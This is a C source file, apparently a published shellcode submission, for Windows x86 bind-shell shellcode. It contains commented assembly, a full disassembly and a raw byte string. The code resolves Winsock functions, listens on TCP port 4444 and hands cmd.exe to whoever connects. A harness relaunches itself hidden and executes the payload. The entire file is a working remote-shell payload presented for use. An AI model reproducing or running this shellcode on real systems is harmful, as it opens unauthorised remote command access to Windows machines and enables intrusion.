/*
	# Title : Windows x86 bind shell tcp shellcode
	# Author : Roziul Hasan Khan Shifat
	# Date : 08-09-2016
	# Tested On : Windows 7 Ultimate , Starter x86
*/

//Note: This shellcode will only works on x86

/*
section .text
	global _start
_start:

xor ecx,ecx
mov eax,[fs:ecx+0x30] ;PEB
mov eax,[eax+0xc] ;PEB.Ldr
mov esi,[eax+0x14] ;PEB.Ldr->InMemOrderModuleList
lodsd
xchg esi,eax
lodsd
mov edi,[eax+0x10] ;kernel32.dll base address


mov ebx,[edi+0x3c] ;DOS->elf_anew
add ebx,edi ;PE HEADER
mov ebx,[ebx+0x78]
add ebx,edi ;kernel32 IMAGE_EXPORT_DIRECTORY


sub esp,32
lea esi,[esp]


mov cx,660

mov edx,[ebx+0x1c] ;AddressOfFunctions
add edx,edi

mov eax,[edx+ecx]
add eax,edi

mov [esi],dword eax ;CreateProcessA() at offset 0

mov cx,1128

mov eax,[edx+ecx]
add eax,edi

mov [esi+4],dword eax ;ExitProcess() at offset 4

;------------------------------------
;finding base address of ws2_32.dll

mov cx,3312

mov eax,[edx+ecx]
add eax,edi

xor ecx,ecx
push 0x41416c6c
mov [esp+2],word cx
push 0x642e3233
push 0x5f327377

lea ebx,[esp]

push ebx
call eax

;---------------------------
mov edi,eax
;---------------------
mov ebx,[edi+0x3c] ;DOS->elf_anew
add ebx,edi ;PE HEADER
mov ebx,[ebx+0x78]
add ebx,edi ; ws2_32.dll IMAGE_EXPORT_DIRECTORY

mov edx,[ebx+0x1c] ;AddressOfFunctions
add edx,edi

xor ecx,ecx
mov cx,456

mov eax,[edx+ecx]
add eax,edi

mov [esi+8],dword eax ;WSAStartup() at offset 8

mov cx,392

mov eax,[edx+ecx]
add eax,edi

mov [esi+12],dword eax ;WSASocketA() at offset 12


mov eax,[edx+4]
add eax,edi

mov [esi+16],dword eax ;bind() at offset 16

mov eax,[edx+48]
add eax,edi

mov [esi+20],dword eax ;listen() at offset 20

mov eax,[edx]
add eax,edi

mov [esi+24],dword eax ;accept() at offset 24

mov eax,[edx+80]
add eax,edi

mov [esi+28],dword eax ;setsockopt() at offset 28
;-------------------------------------------------
;WSAStartup(514, &WSADATA)
mov cx,400
sub esp,ecx

lea ebx,[esp]

mov cx,514

push ebx
push ecx

call dword [esi+8]


;-----------------------------------------
;WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL)

xor ecx,ecx

push ecx
push ecx
push ecx

mov cl,6
push ecx

sub ecx,5
push ecx

inc ecx
push ecx

call dword [esi+12]
;----------------------------
mov edi,eax ;SOCKET

;----------------------------------
;setsockopt(sock,0xffff,4,&int l=1,int j=2)

cdq
mov dl,2

push edx
dec edx

push edx
lea ecx,[esp]

mov dl,4

push ecx
push edx

mov dx,0xffff
push edx
push edi

call dword [esi+28]


;--------------------------------------------
;bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16);

cdq

push edx
push edx
push edx
push edx

mov [esp],byte 2
mov [esp+2],word 0x5c11 ;port 4444

lea ecx,[esp]
mov dl,16

push edx
push ecx
push edi

call dword [esi+16]

;--------------------------------
;listen(SOCKET,1);
cdq
inc edx
push edx
push edi

call dword [esi+20]
;-----------------------------
;accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,&16);

cdq
push edx
push edx
push edx
push edx
mov dl,16
lea ecx,[esp]



push edx
lea ebx,[esp]

push ebx
push ecx
push edi

call dword [esi+24]
;-----------------------
mov edi,eax ;CLIent socket
;-----------------------

cdq
sub esp,16
lea ebx,[esp] ;PROCESS_INFORMATION

push edi
push edi
push edi
push edx

push edx

mov dl,255
inc edx

push edx
cdq

push edx
push edx
push edx
push edx
push edx

push edx
push edx
push edx
push edx
push edx

mov dl,68
push edx

lea ecx,[esp] ;STARTUPINFOA

cdq
push 0x41657865
mov [esp+3],byte dl
push 0x2e646d63

lea eax,[esp]

;---------------------------------------------
;CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&STARTUPINFOA,&PROCESS_INFORMATION)

push ebx
push ecx

push edx
push edx
push edx

inc edx
push edx
cdq

push edx
push edx

push eax
push edx

call dword [esi]
;-----------------------
push eax
call dword [esi+4]

*/


/*

Disassembly of section .text:

00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	64 8b 41 30          	mov    %fs:0x30(%ecx),%eax
   6:	8b 40 0c             	mov    0xc(%eax),%eax
   9:	8b 70 14             	mov    0x14(%eax),%esi
   c:	ad                   	lods   %ds:(%esi),%eax
   d:	96                   	xchg   %eax,%esi
   e:	ad                   	lods   %ds:(%esi),%eax
   f:	8b 78 10             	mov    0x10(%eax),%edi
  12:	8b 5f 3c             	mov    0x3c(%edi),%ebx
  15:	01 fb                	add    %edi,%ebx
  17:	8b 5b 78             	mov    0x78(%ebx),%ebx
  1a:	01 fb                	add    %edi,%ebx
  1c:	83 ec 20             	sub    $0x20,%esp
  1f:	8d 34 24             	lea    (%esp),%esi
  22:	66 b9 94 02          	mov    $0x294,%cx
  26:	8b 53 1c             	mov    0x1c(%ebx),%edx
  29:	01 fa                	add    %edi,%edx
  2b:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  2e:	01 f8                	add    %edi,%eax
  30:	89 06                	mov    %eax,(%esi)
  32:	66 b9 68 04          	mov    $0x468,%cx
  36:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  39:	01 f8                	add    %edi,%eax
  3b:	89 46 04             	mov    %eax,0x4(%esi)
  3e:	66 b9 f0 0c          	mov    $0xcf0,%cx
  42:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  45:	01 f8                	add    %edi,%eax
  47:	31 c9                	xor    %ecx,%ecx
  49:	68 6c 6c 41 41       	push   $0x41416c6c
  4e:	66 89 4c 24 02       	mov    %cx,0x2(%esp)
  53:	68 33 32 2e 64       	push   $0x642e3233
  58:	68 77 73 32 5f       	push   $0x5f327377
  5d:	8d 1c 24             	lea    (%esp),%ebx
  60:	53                   	push   %ebx
  61:	ff d0                	call   *%eax
  63:	89 c7                	mov    %eax,%edi
  65:	8b 5f 3c             	mov    0x3c(%edi),%ebx
  68:	01 fb                	add    %edi,%ebx
  6a:	8b 5b 78             	mov    0x78(%ebx),%ebx
  6d:	01 fb                	add    %edi,%ebx
  6f:	8b 53 1c             	mov    0x1c(%ebx),%edx
  72:	01 fa                	add    %edi,%edx
  74:	31 c9                	xor    %ecx,%ecx
  76:	66 b9 c8 01          	mov    $0x1c8,%cx
  7a:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  7d:	01 f8                	add    %edi,%eax
  7f:	89 46 08             	mov    %eax,0x8(%esi)
  82:	66 b9 88 01          	mov    $0x188,%cx
  86:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  89:	01 f8                	add    %edi,%eax
  8b:	89 46 0c             	mov    %eax,0xc(%esi)
  8e:	8b 42 04             	mov    0x4(%edx),%eax
  91:	01 f8                	add    %edi,%eax
  93:	89 46 10             	mov    %eax,0x10(%esi)
  96:	8b 42 30             	mov    0x30(%edx),%eax
  99:	01 f8                	add    %edi,%eax
  9b:	89 46 14             	mov    %eax,0x14(%esi)
  9e:	8b 02                	mov    (%edx),%eax
  a0:	01 f8                	add    %edi,%eax
  a2:	89 46 18             	mov    %eax,0x18(%esi)
  a5:	8b 42 50             	mov    0x50(%edx),%eax
  a8:	01 f8                	add    %edi,%eax
  aa:	89 46 1c             	mov    %eax,0x1c(%esi)
  ad:	66 b9 90 01          	mov    $0x190,%cx
  b1:	29 cc                	sub    %ecx,%esp
  b3:	8d 1c 24             	lea    (%esp),%ebx
  b6:	66 b9 02 02          	mov    $0x202,%cx
  ba:	53                   	push   %ebx
  bb:	51                   	push   %ecx
  bc:	ff 56 08             	call   *0x8(%esi)
  bf:	31 c9                	xor    %ecx,%ecx
  c1:	51                   	push   %ecx
  c2:	51                   	push   %ecx
  c3:	51                   	push   %ecx
  c4:	b1 06                	mov    $0x6,%cl
  c6:	51                   	push   %ecx
  c7:	83 e9 05             	sub    $0x5,%ecx
  ca:	51                   	push   %ecx
  cb:	41                   	inc    %ecx
  cc:	51                   	push   %ecx
  cd:	ff 56 0c             	call   *0xc(%esi)
  d0:	89 c7                	mov    %eax,%edi
  d2:	99                   	cltd
  d3:	b2 02                	mov    $0x2,%dl
  d5:	52                   	push   %edx
  d6:	4a                   	dec    %edx
  d7:	52                   	push   %edx
  d8:	8d 0c 24             	lea    (%esp),%ecx
  db:	b2 04                	mov    $0x4,%dl
  dd:	51                   	push   %ecx
  de:	52                   	push   %edx
  df:	66 ba ff ff          	mov    $0xffff,%dx
  e3:	52                   	push   %edx
  e4:	57                   	push   %edi
  e5:	ff 56 1c             	call   *0x1c(%esi)
  e8:	99                   	cltd
  e9:	52                   	push   %edx
  ea:	52                   	push   %edx
  eb:	52                   	push   %edx
  ec:	52                   	push   %edx
  ed:	c6 04 24 02          	movb   $0x2,(%esp)
  f1:	66 c7 44 24 02 11 5c 	movw   $0x5c11,0x2(%esp)
  f8:	8d 0c 24             	lea    (%esp),%ecx
  fb:	b2 10                	mov    $0x10,%dl
  fd:	52                   	push   %edx
  fe:	51                   	push   %ecx
  ff:	57                   	push   %edi
 100:	ff 56 10             	call   *0x10(%esi)
 103:	99                   	cltd
 104:	42                   	inc    %edx
 105:	52                   	push   %edx
 106:	57                   	push   %edi
 107:	ff 56 14             	call   *0x14(%esi)
 10a:	99                   	cltd
 10b:	52                   	push   %edx
 10c:	52                   	push   %edx
 10d:	52                   	push   %edx
 10e:	52                   	push   %edx
 10f:	b2 10                	mov    $0x10,%dl
 111:	8d 0c 24             	lea    (%esp),%ecx
 114:	52                   	push   %edx
 115:	8d 1c 24             	lea    (%esp),%ebx
 118:	53                   	push   %ebx
 119:	51                   	push   %ecx
 11a:	57                   	push   %edi
 11b:	ff 56 18             	call   *0x18(%esi)
 11e:	89 c7                	mov    %eax,%edi
 120:	99                   	cltd
 121:	83 ec 10             	sub    $0x10,%esp
 124:	8d 1c 24             	lea    (%esp),%ebx
 127:	57                   	push   %edi
 128:	57                   	push   %edi
 129:	57                   	push   %edi
 12a:	52                   	push   %edx
 12b:	52                   	push   %edx
 12c:	b2 ff                	mov    $0xff,%dl
 12e:	42                   	inc    %edx
 12f:	52                   	push   %edx
 130:	99                   	cltd
 131:	52                   	push   %edx
 132:	52                   	push   %edx
 133:	52                   	push   %edx
 134:	52                   	push   %edx
 135:	52                   	push   %edx
 136:	52                   	push   %edx
 137:	52                   	push   %edx
 138:	52                   	push   %edx
 139:	52                   	push   %edx
 13a:	52                   	push   %edx
 13b:	b2 44                	mov    $0x44,%dl
 13d:	52                   	push   %edx
 13e:	8d 0c 24             	lea    (%esp),%ecx
 141:	99                   	cltd
 142:	68 65 78 65 41       	push   $0x41657865
 147:	88 54 24 03          	mov    %dl,0x3(%esp)
 14b:	68 63 6d 64 2e       	push   $0x2e646d63
 150:	8d 04 24             	lea    (%esp),%eax
 153:	53                   	push   %ebx
 154:	51                   	push   %ecx
 155:	52                   	push   %edx
 156:	52                   	push   %edx
 157:	52                   	push   %edx
 158:	42                   	inc    %edx
 159:	52                   	push   %edx
 15a:	99                   	cltd
 15b:	52                   	push   %edx
 15c:	52                   	push   %edx
 15d:	50                   	push   %eax
 15e:	52                   	push   %edx
 15f:	ff 16                	call   *(%esi)
 161:	50                   	push   %eax
 162:	ff 56 04             	call   *0x4(%esi)
*/


#include<windows.h>
#include<stdio.h>
#include<shellapi.h>
#include<stdlib.h>

char shellcode[]=\

"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x78\x10\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x83\xec\x20\x8d\x34\x24\x66\xb9\x94\x02\x8b\x53\x1c\x01\xfa\x8b\x04\x0a\x01\xf8\x89\x06\x66\xb9\x68\x04\x8b\x04\x0a\x01\xf8\x89\x46\x04\x66\xb9\xf0\x0c\x8b\x04\x0a\x01\xf8\x31\xc9\x68\x6c\x6c\x41\x41\x66\x89\x4c\x24\x02\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x8d\x1c\x24\x53\xff\xd0\x89\xc7\x8b\x5f\x3c\x01\xfb\x8b\x5b\x78\x01\xfb\x8b\x53\x1c\x01\xfa\x31\xc9\x66\xb9\xc8\x01\x8b\x04\x0a\x01\xf8\x89\x46\x08\x66\xb9\x88\x01\x8b\x04\x0a\x01\xf8\x89\x46\x0c\x8b\x42\x04\x01\xf8\x89\x46\x10\x8b\x42\x30\x01\xf8\x89\x46\x14\x8b\x02\x01\xf8\x89\x46\x18\x8b\x42\x50\x01\xf8\x89\x46\x1c\x66\xb9\x90\x01\x29\xcc\x8d\x1c\x24\x66\xb9\x02\x02\x53\x51\xff\x56\x08\x31\xc9\x51\x51\x51\xb1\x06\x51\x83\xe9\x05\x51\x41\x51\xff\x56\x0c\x89\xc7\x99\xb2\x02\x52\x4a\x52\x8d\x0c\x24\xb2\x04\x51\x52\x66\xba\xff\xff\x52\x57\xff\x56\x1c\x99\x52\x52\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\x8d\x0c\x24\xb2\x10\x52\x51\x57\xff\x56\x10\x99\x42\x52\x57\xff\x56\x14\x99\x52\x52\x52\x52\xb2\x10\x8d\x0c\x24\x52\x8d\x1c\x24\x53\x51\x57\xff\x56\x18\x89\xc7\x99\x83\xec\x10\x8d\x1c\x24\x57\x57\x57\x52\x52\xb2\xff\x42\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x8d\x0c\x24\x99\x68\x65\x78\x65\x41\x88\x54\x24\x03\x68\x63\x6d\x64\x2e\x8d\x04\x24\x53\x51\x52\x52\x52\x42\x52\x99\x52\x52\x50\x52\xff\x16\x50\xff\x56\x04";

int main(int i,char *a[])
{

	int mode;



	if(i==1)
	mode=1;
	else
	mode=atoi(a[1]);

switch(mode)
{
	case 1:
	ShellExecute(NULL,NULL,a[0],"78",NULL,0);
	break;

	case 78:
	(* (int(*)())shellcode )();
	break;

	default:
	break;
}


return 0;
}